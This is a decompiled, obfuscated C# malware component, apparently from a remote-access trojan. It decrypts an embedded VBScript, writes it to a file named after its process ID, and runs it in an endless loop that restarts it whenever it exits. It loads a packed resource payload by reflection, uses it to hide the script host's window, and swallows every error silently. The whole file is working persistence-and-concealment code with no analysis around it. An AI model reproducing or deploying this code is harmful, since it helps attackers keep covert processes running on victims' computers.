using System;
using System.ComponentModel;
using System.Diagnostics;
using System.IO;
using System.Reflection;
using System.Resources;
using System.Runtime.CompilerServices;
using System.Threading;
using System.Windows.Forms;
using Microsoft.VisualBasic.CompilerServices;
using n.My.Resources;

namespace n;

public class A
{
	[AccessedThroughProperty("B")]
	private BackgroundWorker _B;

	public static Process fj = new Process();

	private string u;

	private string z;

	public virtual BackgroundWorker B
	{
		get
		{
			return _B;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		set
		{
			DoWorkEventHandler value2 = delegate
			{
				D();
			};
			if (_B != null)
			{
				_B.DoWork -= value2;
			}
			_B = value;
			if (_B != null)
			{
				_B.DoWork += value2;
			}
		}
	}

	public A()
	{
		B = new BackgroundWorker();
		u = Application.get_StartupPath() + "\\" + Process.GetCurrentProcess().Id + ".vbs";
		string s = Resources.Q;
		z = API.DEB(ref s).Replace("NJP", Application.get_ExecutablePath()).Replace("NJF", Conversions.ToString(Process.GetCurrentProcess().Id));
	}

	public void D()
	{
		ResourceManager resourceManager = new ResourceManager("nv.Resources", Assembly.LoadFile(Application.get_ExecutablePath()));
		byte[] b = (byte[])resourceManager.GetObject("P");
		bool CM = false;
		byte[] F = API.ZIP(b, ref CM);
		while (true)
		{
			try
			{
				File.WriteAllText(u, z);
				fj.StartInfo.FileName = u;
				fj.Start();
			}
			catch (Exception projectError)
			{
				ProjectData.SetProjectError(projectError);
				ProjectData.ClearProjectError();
			}
			while (true)
			{
				try
				{
					string C = "P.V";
					string S = "FWD";
					object P = new object[1] { "Windows Script Host" };
					int num = Conversions.ToInteger(n.C.inv(ref F, ref C, ref S, ref P));
					S = "P.V";
					C = "Iswd";
					P = new object[1] { num };
					if (Operators.ConditionalCompareObjectEqual(n.C.inv(ref F, ref S, ref C, ref P), (object)1, false))
					{
						try
						{
							fj.Kill();
						}
						catch (Exception projectError2)
						{
							ProjectData.SetProjectError(projectError2);
							try
							{
								API.wd.ShowWindow(num, 0);
							}
							catch (Exception projectError3)
							{
								ProjectData.SetProjectError(projectError3);
								ProjectData.ClearProjectError();
							}
							ProjectData.ClearProjectError();
						}
					}
				}
				catch (Exception projectError4)
				{
					ProjectData.SetProjectError(projectError4);
					ProjectData.ClearProjectError();
				}
				Thread.Sleep(100);
				try
				{
					if (fj.WaitForExit(100))
					{
						break;
					}
				}
				catch (Exception projectError5)
				{
					ProjectData.SetProjectError(projectError5);
					ProjectData.ClearProjectError();
					return;
				}
			}
		}
	}
}
